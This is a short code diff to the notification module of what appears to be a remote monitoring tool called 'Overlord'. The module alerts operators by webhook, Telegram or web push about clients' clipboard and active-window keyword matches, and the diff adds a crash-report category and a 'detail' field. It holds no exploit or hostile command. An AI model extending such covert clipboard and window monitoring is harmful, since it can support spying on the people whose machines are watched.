@@ -20,9 +20,10 @@ export type NotificationRecord = {
   title: string;
   process?: string;
   processPath?: string;
+  detail?: string;
   pid?: number;
   keyword?: string;
-  category: "active_window" | "clipboard";
+  category: "active_window" | "clipboard" | "crash_report";
   ts: number;
   screenshotId?: string;
 };
@@ -50,10 +51,10 @@ export type UserDeliveryTarget = {
 };
 
 export const DEFAULT_WEBHOOK_TEMPLATE =
-  `{"type":"notification","data":{"title":"{title}","keyword":"{keyword}","clientId":"{clientId}","user":"{user}","host":"{host}","process":"{process}","os":"{os}","pid":"{pid}","ts":"{ts}"}}`;
+  `{"type":"notification","data":{"title":"{title}","keyword":"{keyword}","clientId":"{clientId}","user":"{user}","host":"{host}","process":"{process}","detail":"{detail}","os":"{os}","pid":"{pid}","ts":"{ts}"}}`;
 
 export const DEFAULT_TELEGRAM_TEMPLATE =
-  `\u{1F514} Notification\nTitle: {title}\nKeyword: {keyword}\nClient: {clientId}\nUser: {user}\nHost: {host}\nProcess: {process}`;
+  `\u{1F514} Notification\nTitle: {title}\nKeyword: {keyword}\nClient: {clientId}\nUser: {user}\nHost: {host}\nProcess: {process}\nDetail: {detail}`;
 
 const NOTIFICATION_SCREENSHOT_WAIT_MS = 5_000;
 const NOTIFICATION_SCREENSHOT_POLL_MS = 250;
@@ -93,6 +94,7 @@ export function renderNotificationTemplate(
     .replace(/{user}/g, record.user ?? "")
     .replace(/{host}/g, record.host ?? "")
     .replace(/{process}/g, record.process ?? "")
+    .replace(/{detail}/g, record.detail ?? "")
     .replace(/{os}/g, record.os ?? "")
     .replace(/{pid}/g, String(record.pid ?? ""))
     .replace(/{ts}/g, String(record.ts ?? ""));
@@ -324,13 +326,16 @@ async function deliverWebPushToAll(
   const targets = getUserDeliveryTargets(record.clientId);
   const allowedUserIds = new Set(targets.map((t) => t.userId));
 
-  const title = record.keyword
+  const title = record.category === "crash_report"
+    ? "Overlord \u2014 Crash Report"
+    : record.keyword
     ? `Overlord \u2014 ${record.keyword}`
     : "Overlord \u2014 Notification";
   const lines = [record.title];
   if (record.user) lines.push(`User: ${record.user}`);
   if (record.host) lines.push(`Host: ${record.host}`);
   if (record.process) lines.push(`Process: ${record.process}`);
+  if (record.detail) lines.push(String(record.detail).slice(0, 300));
 
   const payload = JSON.stringify({
     type: "notification",
